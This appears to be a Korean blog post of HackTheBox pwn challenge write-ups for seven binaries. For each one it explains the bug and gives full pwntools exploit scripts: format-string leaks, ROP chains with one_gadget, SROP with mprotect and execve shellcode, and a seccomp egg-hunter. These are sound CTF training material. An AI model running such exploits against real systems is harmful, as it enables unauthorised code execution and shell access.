---
layout: post
title:  "HackTheBox Pwn Study - 1"
author: 5un9hun
categories: [ HackTheBox ]
tags: [ HTB, Pwn ]
image: assets/images/htb/pwn/title.png
description: "hackthebox pwn study - 1"
hidden: false
---

pwn 분야는 내 주 분야이기도 해서 한 번 다 풀어볼 예정이다.

- [1. racecar - very easy (10pts)](#1-racecar---very-easy-10pts)
- [2. Space pirate: Retribution - very easy (10pts)](#2-space-pirate-retribution---very-easy-10pts)
- [3. You know 0xDiablos - easy (20pts)](#3-you-know-0xdiablos---easy-20pts)
- [4. Sick ROP - easy (30pts)](#4-sick-rop---easy-30pts)
- [5. Hunting - easy (30pts)](#5-hunting---easy-30pts)
- [6. Restaurant - easy (20pts)](#6-restaurant---easy-20pts)
- [7. Bad grades - easy (30pts)](#7-bad-grades---easy-30pts)
- [8. Fleet Management - easy (20pts)](#8-fleet-management---easy-20pts)
- [9. Kernel Adventures: Part 1 - medium (50pts)](#9-kernel-adventures-part-1---medium-50pts)


## 1. racecar - very easy (10pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled.png)

바이너리 파일이 주어진다.

### 풀이 과정

바이너리가 주어지고, 32bits 로 컴파일된 파일이다. 보호 기법은 다음과 같다.

![Untitled](/assets/images/htb/pwn/Untitled%201.png)

소스 코드는 스킵.

먼저 프로그램의 간단한 기능은 다음과 같다.

1. Name 입력, Nickname 입력
2. 메뉴 출력 (1. Car info 2. Car selection)
3. 각각의 메뉴에 따라 함수 호출
4. Car info는 차량 2대의 스탯을 출력해준다.
5. Car selection은 2대의 차량 중 1개를 선택하여 경주를 하는 것이다. 이기면 flag를 출력시켜준다.

**취약점 탐색**

이제 취약한 포인트를 찾아야 한다.

다음은 flag를 읽어와서 특정 버퍼에 저장하는 로직이다. 

```c
void *buf; // [esp+18h] [ebp-40h]
FILE *stream; // [esp+1Ch] [ebp-3Ch]
char v13[44]; // [esp+20h] [ebp-38h] BYREF

...

if ( v9 == 1 && (result = v5, v5 < v7) || v9 == 2 && (result = v5, v5 > v7) )
  {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n", "\x1B[1;32m");
    coins += 100;
    printf("[+] Current coins: [%d]%s\n", coins, "\x1B[1;36m");
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s", "\x1B[0m");
    buf = malloc(0x171u);
    stream = fopen("flag.txt", "r");
    if ( !stream )
    {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n", "\x1B[1;31m");
      exit(105);
    }
    fgets(v13, 44, stream);
    read(0, buf, 0x170u);
    puts("\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m");
    result = printf((const char *)buf);
  }
```

처음의 if문 로직은 1번, 2번 선택을 통해 간단하게 진입할 수 있는데, 플래그를 v13 버퍼에 저장하고, 출력은 buf 버퍼로 한다.

buf 버퍼에 사용자의 입력 170개를 fgets 함수로 받기 때문에 Buffer Overflow 취약점이 발생하게 되지만, 보호기법 때문에 막힌다.

하지만 또 다른 취약점인 Format String Bug가 발생하여 flag를 leak이 가능하다.

v10 버퍼는 offset 12위치부터 시작한다. 따라서 거기서부터 leak을 하면된다.

**페이로드**

```python
from pwn import *
from binascii import *

#r = process('racecar')
r = remote('159.65.85.171', 30439)

r.sendlineafter(b'Name: ', b'5un9hun')
r.sendlineafter(b'Nickname: ', b'5un9hun')

r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'> ', b'2')

payload = b''
payload += b'%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x'

r.sendlineafter(b'> ', payload)
r.recvuntil(b'this: \x1B[0m\n')

result = ''
flag = str(r.recv()[:-1])[2:-1].split(' ')
for i in flag:
	result += unhexlify(i).decode()[::-1]

print("FLAG : " + result)
r.close()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%202.png)

## 2. Space pirate: Retribution - very easy (10pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%203.png)

libc 파일과 바이너리 파일 등이 주어진다.

### 풀이 과정

제일 먼저 보호기법을 살펴보면 다음과 같다. canary가 없는 것을 보아하니 Buffer Overflow의 냄새가 난다.

![Untitled](/assets/images/htb/pwn/Untitled%204.png)

문제 기능을 살펴보면 다음과 같다.

1. 메뉴 출력후 1번 또는 2번에 대응하는 숫자 입력
2. 1번은 show_missiles 함수를 호출한다.
3. 2번은 missile_launcher함수를 호출한다.
4. show_missiles 함수는 2개의 미사일 stat을 출력시킨다.
5. missile_launcher 함수는 좌표값을 출력시키고, 새로운 좌표를 입력받고, 이후 한 번 더 입력을 받는다.

**취약점 탐색**

취약점은 missile_launcher 함수에서 발생한다. 새로운 좌표를 입력받고, 이후 한 번 더 입력을 받을 때 사이즈가 132이기 때문에 ret값을 조작할 수 있다.

```python
__int64 v1[4]; // [rsp+0h] [rbp-50h] BYREF
char buf[32]; // [rsp+20h] [rbp-30h] BYREF
__int64 v3; // [rsp+40h] [rbp-10h]
__int64 v4; // [rsp+48h] [rbp-8h]

...

read(0, v1, 132uLL);
```

프로그램 내에서 flag를 출력시키는 로직은 없기 때문에 ROP를 이용해서 직접 셸을 얻어야한다.

문제 파일에서는 libc 파일을 제공하기 때문에 libc_leak후에 one_gadget을 호출시키면 될 것 같다.

하지만 PIE 보호기법이 걸려있기 때문에 got 테이블의 주소나 다른 함수의 주소를 바로 이용할 수 없다. PIE base의 주소를 알아야하기 때문이다.

PIE base의 주소를 leak할 포인트를 찾다가 missile_launcher 코드를 보면 v1 버퍼는 널값으로 초기화를 시켜주지만, buf 버퍼는 초기화를 시키지 않고 바로 입력을 받는다. 

```c
int missile_launcher()
{
  __int64 v1[4]; // [rsp+0h] [rbp-50h] BYREF
  char buf[32]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v3; // [rsp+40h] [rbp-10h]
  __int64 v4; // [rsp+48h] [rbp-8h]

...

//v1 버퍼 초기화
  v1[0] = 0LL;
  v1[1] = 0LL;
  v1[2] = 0LL;
  v1[3] = 0LL;

//buf 버퍼는 초기화 안함
  read(0, buf, 0x1FuLL); // pie base leak
  printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", buf); // pie base leak

...
```

gdb로 해당 주소에 어떤 값이 들어있나 확인을 해보면 다음과 같다. 

![Untitled](/assets/images/htb/pwn/Untitled%205.png)

총 32바이트의 주소에 다음과 같은 값이 들어있다. 따라서 저 4개중 1개의 값을 leak하고 PIE Base간의 offset을 구해서 빼면 PIE Base 주소를 구할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%206.png)

나는 4개중 2번째에 있는 값을 leak할 것이고, 그 offset은 0xd70이다.

다음과 같이 PIE Base를 leak한 것을 알 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%207.png)

![Untitled](/assets/images/htb/pwn/Untitled%208.png)

이제 leak을 했으면 got 테이블이나 다른 함수들의 주소도 알 수 있기 때문에 이를 이용하여 exit_got 테이블을 printf 함수로 leak하여 Libc Base를 구할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%209.png)

이후 leak을 진행하고 missile_launcher 함수로 다시 돌아가 입력을 받고, 주어진 libc 파일을 이용해 one gadget 주소를 구한 후 ROP로 exploit 해주면 셸을 획득할 수 있다.

**페이로드**

```python
from pwn import *

r = remote('139.59.188.168', 32682)
#r = process('sp_retribution')

printf_plt_offset = 0x770
exit_got_offset = 0x202fc8
missile_launcher_offset = 0xa22
pr = 0xd33
ret = 0xaeb

exit_offset = 0x3a040

og = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

r.sendlineafter(b'>> ', b'2')
r.sendafter(b'y = ', b'A'*8)

#pie_base leak
r.recvuntil(b'A'*8)
leak = u64(r.recv(6) + b'\x00\x00')
pie_base = leak - 0xd70
printf_plt = pie_base + printf_plt_offset
exit_got = pie_base + exit_got_offset
missile_launcher = pie_base + missile_launcher_offset

log.info("PIE Base : " + hex(pie_base))

#libc_leak
payload = b''
payload += b'A'*0x50
payload += b'B'*8
payload += p64(pie_base + ret)
payload += p64(pie_base + pr)
payload += p64(exit_got)
payload += p64(printf_plt)
payload += p64(missile_launcher)

r.sendafter(b'(y/n): ', payload)

r.recvuntil(b'have been reset!\x1B[1;34m\n')
exit_addr = u64(r.recv(6) + b'\x00\x00')
libc_base = exit_addr - exit_offset

log.info("Libc Base : " + hex(libc_base))

#exploit
r.sendafter(b'y = ', b'A'*8)

payload = b''
payload += b'A'*0x50
payload += b'B'*8
payload += p64(libc_base + og[1])

#gdb.attach(r)

r.sendafter(b'(y/n): ', payload)

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2010.png)

## 3. You know 0xDiablos - easy (20pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2011.png)

바이너리 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다. 벌써부터 굉장히 쉬워보인다.

![Untitled](/assets/images/htb/pwn/Untitled%2012.png)

대충 프로그램의 기능을 나열하면 다음과 같다.

1. vuln 함수 호출
2. vuln 함수에서 gets 함수를 통해 s 버퍼에 입력을 받음.
3. 입력받은 문자열을 puts 함수로 출력시킴.

엄청 간단한 프로그램이다.

**취약점 탐색**

프로그램이 간단하다보니 바로 취약점이 보인다. gets 함수를 사용해서 Buffer Overflow가 발생한다. 보호기법이 아무것도 걸려있지 않아서 바로 ROP를 이용해서 셸을 딸 수 있지만, 이 프로그램 내 정의된 사용자 정의 함수가 존재한다.

다음의 flag 함수가 있다.

```c
char *__cdecl flag(int a1, int a2)
{
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Hurry up and try in on server side.");
    exit(0);
  }
  result = fgets(s, 64, stream);
  if ( a1 == 0xDEADBEEF && a2 == 0xC0DED00D )
    result = (char *)printf(s);
  return result;
}
```

마지막 부분의 코드를 보면 첫번째 인자와 두번째 인자가 각각의 값에 대응될 때, flag를 출력시켜준다.

따라서 첫번째 인자로 0xDEADBEEF, 두번재 인자로 0xC0DED00D를 넣어주고 flag 함수를 호출하면 flag를 얻을 수 있다.

**페이로드**

```python
from pwn import *

r = remote('46.101.33.243',32587)

flag = 0x80491e2
ppr = 0x0804938a

payload = b''
payload += b'A'*0xB8
payload += b'B'*4
payload += p32(flag)
payload += p32(ppr)
payload += p32(0xDEADBEEF)
payload += p32(0xC0DED00D)

r.sendline(payload)

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2013.png)

## 4. Sick ROP - easy (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2014.png)

바이너리 파일이 주어진다.

### 풀이 과정

먼저 보호기법을 살펴보았다.

![Untitled](/assets/images/htb/pwn/Untitled%2015.png)

함수 목록을 살펴보면 다음 4개밖에 존재하지 않는다.

![Untitled](/assets/images/htb/pwn/Untitled%2016.png)

프로그램 기능을 나열하면 다음과 같다.

1. _start 함수에서 while문을 통해 vuln 함수를 무한 호출한다.
2. vuln 함수에서는 read 함수와 write 함수를 각각 호출한다.
3. read 함수의 인자로 버퍼와 0x300을 보내 함수 내부적으로 read(0, buf, 0x300)를 호출한다. write 함수도 비슷하게 호출된다.

**취약점 탐색**

취약점이라고 할 것도 없이 read 함수에서 300바이트의 입력을 받아서 Buffer Overflow가 발생한다. 

하지만 이를 이용해서 ROP를 진행하기에는 가젯이 별로 없다.

![Untitled](/assets/images/htb/pwn/Untitled%2017.png)

여기서는 SROP(Sigreturn-oriented-programming)를 이용해서 문제를 해결할 수 있다.

이 기법은 **sigreturn syscall**을 이용해서 레지스터값을 컨트롤 할 수 있는 기법이다.

- 필요 조건
    1. syscall 가젯 
    2. rax 컨트롤 가능 (syscall 호출 번호 용도)
- 작동 원리
    
    **정상적인 sigreturn system call**
    
    여러 가지 이유로 프로그램에 시그널이 발생할 때, 커널에서는 signal handler를 실행시켜주는데 이 때, kernel mode로 전환되어서 do_signal() -> handle_signal() 호출한다. 그리고 signal handler 의 등록 여부를 확인하고, 등록되어있으면 setup_frame() 으로 UserMode의 context가 저장되어 있는 UserModeStack을(레지스터) 조작하여 해당 signal 이 실행될 수 있게 하고, sigreturn system call이 발생한다. 그리고 끝나면 UserMode로 다시 변경되어 저장되어 있던 원래의 UserModeStack(레지스터)을 복구한다.
    
    ![Untitled](/assets/images/htb/pwn/Untitled%2018.png)
    
    **비정상적인 sigreturn system call**
    
    rop를 이용해 그냥 sigreturn() 을 호출해주면 호출시점의 rsp 기준으로 레지스터 프레임 구조체만큼 레지스터값들을 저장하기 때문에 변조할 수 있다.
    

이제 어떻게 exploit을 할까가 문제인데 생각한 방법은 다음과 같다.

1. bss영역에 “/bin/sh\x00” 문자열을 저장해놓고, execve(’/bin/sh’, NULL, NULL)을 호출한다.
2. mprotect 함수를 사용하면 특정 영역에 실행 권한을 부여할 수 있어서 쉘코드를 실행시킨다.

1번 같은 경우 syscall을 총 3번해야해서 더 짧게 할 수 있는 2번을 채택했다.

익스플로잇 방식은 다음과 같다.

- read 함수에서 overflow 발생 → vuln 함수의 ret 덮을 수 있음.
- ret에 vuln 함수를 다시 호출하고, vuln 함수가 끝나면 syscall 이 호출될 수 있도록 chain 구성
    
    (buffer + rbp + ret) → ret = vuln 주소(8) + syscall 가젯(8)
    
- 따라서 read, write의 리턴값이 입력한 값의 개수만큼 리턴(rax = return값)하기 때문에 이를 이용해서 rax에 syscall 번호를 맞추어주고, syscall 을 호출하면 해당하는 함수 호출(sigreturn)
- sigreturn 프레임에서 레지스터 조작 가능 → mprotect 함수 호출(0x400000~0x402000 rwx 부여)
- mprotect syscall 호출된 후, 다시 vuln 호출하게 하여 read 함수에서 쉘코드 저장 및 overflow로 vuln의 ret값을 버퍼의 주소로 저장
- vuln 함수가 끝나면 쉘코드가 들어있는 버퍼로 이동해서 쉘코드 실행

sigreturn 프레임 값에 저장된 mprotect 호출을 마치면 그 다음 실행할 주소를 rsp를 통해 가져온다. 다시 쉘코드를 입력해야하므로 vuln의 주소가 담긴 포인터를 찾아서 sigreturn 프레임의 rsp의 위치에 넣어줘야한다.

vuln 함수의 포인터값은 다음처럼 찾을 수 있었다.

![Untitled](/assets/images/htb/pwn/Untitled%2019.png)

이를 토대로 SigreturnFrame 클래스를 이용해서 페이로드를 구성했다.

```python
frame = SigreturnFrame()
frame.rax = 0xa	      # mprotect call
frame.rdi = 0x400000	# 0x400000
frame.rsi = 0x2000	  # 0x402000
frame.rdx = 0x7	      # 7 = rwx 
frame.rsp = vuln_p	  # not vuln addr, pointer
frame.rip = syscall	  # syscall gadget
```

이제 페이로드를 보내면, mprotect 함수가 호출되는데 vmmap 을 이용해서 영역 권한을 보면 mprotect 함수가 잘 호출된 것을 확인할 수 있다.

전)

![Untitled](/assets/images/htb/pwn/Untitled%2020.png)

후)

![Untitled](/assets/images/htb/pwn/Untitled%2021.png)

이제 쉘코드를 입력하기 위해 vuln함수로 돌아오게 구성했다. 그러면 다시 vuln 함수를 통해 read 함수가 호출되게 된다.

read 함수가 호출되면 read의 두번째인자인 버퍼의 주소에 값이 저장된다. 하지만 이 버퍼의 주소는 원래 주소가 아니라 rsp기준으로 + 8의 주소의 값에 저장하기 때문에 문제가 생긴다고 생각했다.

![Untitled](/assets/images/htb/pwn/Untitled%2022.png)

하지만 mprotect 함수로 0x400000~0x402000 까지 rwx 권한을 부여했기 때문에 rsp + 8 의 영역을 버퍼로 사용할 수 있었다. 

그렇기 때문에 0x4010b8 주소에 값에 쉘코드를 넣어주고, vuln의 ret 주소를 이 주소(0x4010b8)로 덮어주면 쉘코드가 실행되어 셸을 획득할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%2023.png)

**페이로드**

```python
from pwn import *

#r = process('./sick_rop')
r = remote('139.59.188.168' ,32263)

#gdb.attach(r)

context.clear(arch='amd64')

syscall = 0x401014
vuln_addr = 0x40102e
vuln_p = 0x4010d8
buf = 0x4010b8
shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

payload = b''
payload += b'A'*0x20
payload += b'B'*8
payload += p64(vuln_addr) # call read (2)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = 0xa	      # mprotect call
frame.rdi = 0x400000	# 0x400000
frame.rsi = 0x2000	  # 0x402000
frame.rdx = 0x7	      # 7 = rwx 
frame.rsp = vuln_p	  # not vuln addr, pointer / call read (3)
frame.rip = syscall	  # syscall gadget

payload += bytes(frame)

# first read
r.send(payload)
r.recv()

payload = b''
payload += b'A'*15 #sigreturn call

# second read
r.send(payload)
r.recv()

payload = b''
payload += shellcode
payload += b'\x90' * (40 - len(payload))
payload += p64(buf)

# final read
r.send(payload)
r.recv()

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2024.png)

## 5. Hunting - easy (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2025.png)

바이너리 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다. PIE 기법만 걸려있다.

![Untitled](/assets/images/htb/pwn/Untitled%2026.png)

이 문제는 디버깅 심볼이 없어서 더 까다로웠다.

먼저 _start 함수에서 엔트리 포인트를 찾아서 main 함수를 찾았다.

다음은 main 함수이다. 기능은 주석으로 적어놓았다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-10h] [ebp-24h]
  int v5; // [esp-Ch] [ebp-20h]
  int v6; // [esp-8h] [ebp-1Ch]
  int v7; // [esp-4h] [ebp-18h]
  void *buf; // [esp+0h] [ebp-14h]
  char *dest; // [esp+4h] [ebp-10h]
  void *addr; // [esp+8h] [ebp-Ch]

  addr = sub_12E8();                            // random 한 주소 
  signal(14, &exit);                            // sigalrm
  alarm(3u);
  dest = mmap(addr, 0x1000u, 3, 49, -1, 0);     // rw 권한 부여
  if ( dest == -1 )                             // mmap 실패하면 실행
    (sub_1118)(-1, v4, v5, v6);
  strcpy(dest, aHtbXxxxxxxxxxx);                // flag를 mmap 반환 주소로 복사
  memset(aHtbXxxxxxxxxxx, 0, sizeof(aHtbXxxxxxxxxxx));// 전역 변수 주소에 있는 flag는 초기화시켜줌
  sub_1259();                                   // seccomp filter
  buf = malloc(60u);
  read(0, buf, 60u);
  (buf)(v7, buf, 0);
  return 0;
}
```

전역변수에 저장된 aHtbXxxxxxxxxxx 는 실제 서버에서 flag가 있을 것이다. 그 값을 mmap을 통해 받아온 가상 주소에 담아놓고 전역변수는 0으로 초기화시킨다.

마지막 코드부분에서 buf를 호출하는데 NX bit 보호기법이 걸려있지 않기 때문에 여기에 쉘코드를 넣으면 셸이 따질 것이다. 하지만 그 전에 sub_1259 함수에서 seccomp filter 를 통해 다음 조건일 때 프로그램을 SIGKILL을 발생시킨다.

![Untitled](/assets/images/htb/pwn/Untitled%2027.png)

평범한 쉘코드로는 익스플로잇을 진행할 수 없다.

그러면 어떤 syscall number를 사용해야할까가 이 문제의 포인트인데 write, read 등의 syscall은 막히지 않았다. 따라서 mmap으로 받아온 가상 주소에 담긴 flag값을 write syscall로  출력시키는 방향으로 진행해야한다.

하지만 또 문제가 있다. mmap으로 받아온 가상 주소에 flag가 있는데 이 주소는 랜덤한 주소라 예측할 수 없고, buf를 call 하기 전에 스택에서 이 가상 주소값을 정리하기 때문에 쉘코드 내에서 flag가 저장된 주소를 알 방법이 없었다.

구글링을 통해 memory를 search해서 flag를 찾는 방식을 찾을 수 있었다. access syscall을 이용하는 방식인데 access 함수는 파일의 권한 여부를 확인하는 함수이다.

먼저 랜덤으로 생성되는 주소의 범위는 처음 함수 sub_12E8과 같다.

```c
int sub_12E8()
{
  unsigned int buf; // [esp+0h] [ebp-18h] BYREF
  int fd; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  read(fd, &buf, 8u);
  close(fd);
  srand(buf);
  for ( i = 0; i <= 0x5FFFFFFF; i = rand() << 16 )
    ;
  return i;
}
```

대충 0x5FFFFFFF 보다 크고, 뒤에 2바이트가 0000이다.

따라서 초기값을 0x5FFFFFFF + 1로 하고, 뒷 바이트 0x10000만큼 증가시켜서 flag 문자열 “HTB{” 를 검색한다.

만약 해당 주소에 주소가 유효하지 않은 주소면 Segment Fault가 발생할텐데 이를 방지하기 위해 access 함수를 이용한다. 따라서 “HTB{” 를 검색하면서도 Segment Fault가 발생하지 않게 할 수 있다. 

만약 해당하는 주소가 유효하지 않다면 i386 기준으로 다음과 같은 값을 리턴하는데 시스템 상으로는 0xf2 값으로 된다.. 이건 잘 모르겠다. (not 0xf2 == 13이긴 한데..)

![Untitled](/assets/images/htb/pwn/Untitled%2028.png)

위의 내용들은 참고해서 코드를 작성하고, 다음과 같은 코드를 obdump 를 통해 기계어로 얻어와서, 약간의 코드를 수정하여 쉘코드를 완성하였다. (null 바이트 제거, 간소화 등등)

```c
#include<stdlib.h>
#include<stdio.h>

int main() {
  for (int address = 0x60000000; address < 0x7fffffff; address += 0x10000) {
      if (access(address, 0) == 0xf2) continue;
      if (*(int*)address == "HTB{") {
            write(1, address, 36);
      }
  }
}
```

또한, 문제 바이너리 파일의 main 함수에서 처음에 signal 함수와 alarm 함수를 통해 3초 뒤에 exit 함수를 호출하므로, alarm 함수를 syscall하여 시간을 늘려줘야했다.

**32bit와 64bit간의 syscall 인자 전달 방식**

32bit 에서 함수를 호출할 때 인자를 각각 스택순으로 가져가게 되는데 syscall 에서는 스택이 아닌 레지스터의 값을 이용하여 인자를 가져간다.

- 32bit 는 eax에 syscall number를 그 다음 ebx, ecx, edx 순으로 인자의 값을 넣는다.
- 64bit 는 rax에 syscall number를 그 다음 rdi, rsi, rdx, rcx, r8, r9 순으로 넣는다.

해당 레지스터 이후 인자들은 32bit나 64bit나 스택에서 참조한다.

최종적으로 다음과 같이 페이로드를 작성하였다.

**페이로드**

```python
from pwn import *

context.arch = 'i386'

#r = process('./hunting')
r = remote('157.245.33.77', 31923)

sc = '''
//alarm(16)
  push   0x1b
  pop    eax
  push   0x10
  pop    ebx
  int    0x80

//access(address, 0) == 0xf2 then next label
  xor    eax, eax
  mov    al, 0x21
  mov    ebx, 0x7b425448
  xor    ecx, ecx
  mov    edx, 0x5fffffff
next:
  or     dx, 0xffff
  inc    edx
  pusha
  lea    ebx, [edx]
  int    0x80
  cmp    al, 0xf2
  popa
  je     next

//write(1, address, 36)
  push   edx
  pop    ecx
  push   0x24
  pop    edx
  push   0x1
  pop    ebx
  push   0x4
  pop    eax
  int    0x80
'''

payload = b''
payload += asm(sc)

print(disasm(payload))

r.sendline(payload)

flag = r.recv()
print("FLAG : " + flag.decode())

r.close()
```

난이도가 너무 확 올라가넹..

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2029.png)


## 6. Restaurant - easy (20pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2030.png)

바이너리 파일과 libc 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다.

![Untitled](/assets/images/htb/pwn/Untitled%2031.png)

프로그램의 기능은 다음과 같다.

1. 메뉴 출력한다. 1번은 fill 함수를 호출, 2번은 drink 함수를 호출한다.
2. fill 함수는 description을 출력하고 입력을 받는다.
3. drink 함수도 2번과 동일하다.

**취약점 탐색**

fill 함수에서 Buffer Overflow가 발생한다.

```c
int __fastcall fill(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)
{
  int v6; // ecx
  int v7; // er8
  int v8; // er9
  __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF

  buf[0] = 0LL;
  buf[1] = 0LL;
  buf[2] = 0LL;
  buf[3] = 0LL;

  ...

  read(0, buf, 0x400uLL); //Buffer Overflow
  return printf("\nEnjoy your %s", (const char *)buf);
}
```

먼저 ASLR 우회를 위해 libc를 leak을 진행해야한다. PIE 보호기법이 걸려있지 않기 때문에 puts 함수로 간단하게 leak할 수 있다. 

또한 leak을 진행한 후에, system gadget 또는 one gadget을 덮어야하는데 Full Relro 보호기법 때문에 쫄았는데 생각해보니 ret 부분에 덮으면 된다.

엄청 간단한 문제였다.

**페이로드**

```python
from pwn import *

r = remote('157.245.46.136', 30793)

e = ELF('libc.so.6')

exit_offset = e.symbols['exit']

puts_plt = 0x400650
exit_got = 0x601FE8
pr = 0x4010a3
fill = 0x400e4a

og = [0x4f3d5, 0x4f432, 0x10a41c]

r.sendlineafter(b'> ', b'1')

payload = b''
payload += b'A'*32
payload += b'B'*8
payload += p64(pr)
payload += p64(exit_got)
payload += p64(puts_plt)
payload += p64(fill)

r.sendafter(b'> ', payload)

r.recvuntil(b'Enjoy your ')
r.recv(len(payload))
exit_addr = u64(r.recvline()[:-1] + b'\x00\x00')
libc_base = exit_addr - exit_offset 
og_addr = libc_base + og[0]
log.info("libc_base : " + hex(libc_base))

payload = b''
payload += b'A'*32
payload += b'B'*8
payload += p64(og_addr)

r.sendafter(b'> ', payload)
r.recvuntil(b'Enjoy your ')
r.recv(len(payload))

r.interactive()
```

hunting 문제랑 난이도가 너무 극과극 아닌가..

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2032.png)

## 7. Bad grades - easy (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2033.png)

바이너리 파일과 libc 파일이 주어진다.

### 풀이 과정

먼저 보호기법을 살펴보면 다음과 같다.

![Untitled](/assets/images/htb/pwn/Untitled%2034.png)

그 다음 프로그램의 기능을 살펴보면 다음과 같다.

1. 디스크립션 출력 및 메뉴 출력.
2. 1번 메뉴는 grade를 보는 것.
3. 2번 메뉴는 새로 추가하는 기능인 것 같다.

**취약점 탐색**

1번 메뉴에서는 별 다른 취약점이 보이지 않았고, 2번 메뉴에서는 다음과 같이 취약점이 발생했다.

성적을 입력받는 double 배열은 33개인데, 입력은 v7을 입력받으므로써 무한정으로 입력할 수 있어서 Buffer Overflow가 발생한다.

```c
unsigned __int64 __fastcall sub_400FD5(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)
{
  int v7; // [rsp+0h] [rbp-120h] BYREF
  int i; // [rsp+4h] [rbp-11Ch]
  double v9; // [rsp+8h] [rbp-118h]
  double v10[33]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v11; // [rsp+118h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v9 = 0.0;
  sub_400ACB("Number of grades: ", "cyan", "bold");
  __isoc99_scanf("%d", &v7);
  for ( i = 0; i < v7; ++i )
  {
    printf("Grade [%d]: ", (unsigned int)(i + 1));
    __isoc99_scanf("%lf", &v10[i]);
    v9 = v10[i] + v9;
  }
  printf("Your new average is: %.2f\n", v9 / (double)v7);
  return __readfsqword(0x28u) ^ v11;
}
```

저번 문제와는 다르게 이번 문제는 Stack Canary 보호기법이 존재했고, 이 canary 값들을 leak할 방법이 존재하지 않았다.

구글링하면서 알게된 사실인데, 다음과 같은 포맷 스트링 입력에서 **.** 을 전송하면 해당 메모리에는 값이 넣어지지 않는다. 

```c
__isoc99_scanf("%lf", &v10[i]);
```

(숫자 이외의 값을 전송해도 저장이 되질 않지만, 입력 스트림이 바로 닫혀버려서 다음 페이로드가 전송이 되질 않는다.)

따라서 canary를 그냥 skip할 수 있고, 바로 rbp → ret 순으로 입력을 할 수 있다.

또 다른 문제가 발생했는데 포맷스트링이 %lf 이므로 입력을 하면 실수로 인식되어 xmm0 레지스터를 통해 저장된다.

따라서 만약에 10을 저장한다 가정하면 다음처럼 저장된다.(실수의 표현)

![Untitled](/assets/images/htb/pwn/Untitled%2035.png)

따라서 이러한 입력을 내가 원하는 정수로 입력하기 위해서 원하는 16진수값을 실수값으로 변환하여 전달하면 된다.

예를 들어서 0x100 을 보내고 싶다하면 다음처럼 변환할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%2036.png)

이후 프로그램에 전달하면 다음처럼 0x100이 잘 들어가 있는 것을 확인할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%2037.png)

이를 토대로 ROP 페이로드를 작성하면 된다. 순서는 libc leak 이후 one_gadget 을 호출하면 된다. (이전 문제인 Restaurant과 동일)

**페이로드**

```python
from pwn import *
import struct

r = remote('157.245.46.136', 30414)
#r = process('bad_grades')

e = ELF('libc.so.6')

def hex2double(n):
  return str(struct.unpack('>d', bytes.fromhex(hex(n)[2:].rjust(16, '0')))[0]).encode()

exit_offset = e.symbols['exit']

pr = 0x401263
exit_got = 0x601FE8
puts_plt = 0x400680
returnfunc = 0x400fd5
og = [0x4f3d5, 0x4f432, 0x10a41c]

r.sendlineafter(b'> ', b'2')

r.sendlineafter(b': ', b'39') #size

payload = []
payload += [b'0' for _ in range(33)] #dummy
payload.append(b'.') #canary
payload.append(b'.') #rbp
payload.append(hex2double(pr)) #ret
payload.append(hex2double(exit_got))
payload.append(hex2double(puts_plt))
payload.append(hex2double(returnfunc))

for i in range(len(payload)):
  r.sendlineafter(b']: ', payload[i])

r.recvline()
exit_addr = u64(r.recv(6) + b'\x00\x00')
libc_base = exit_addr - exit_offset
log.info('libc_base : ' + hex(libc_base))
og_addr = libc_base + og[0]

r.sendlineafter(b': ', b'36') #size

payload = []
payload += [b'0' for _ in range(33)] #dummy
payload.append(b'.') #canary
payload.append(b'.') #rbp
payload.append(hex2double(og_addr)) #ret

#gdb.attach(r, 'b*0x4010f1\nc')

for i in range(len(payload)):
  r.sendlineafter(b']: ', payload[i])

r.recvline()

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2038.png)

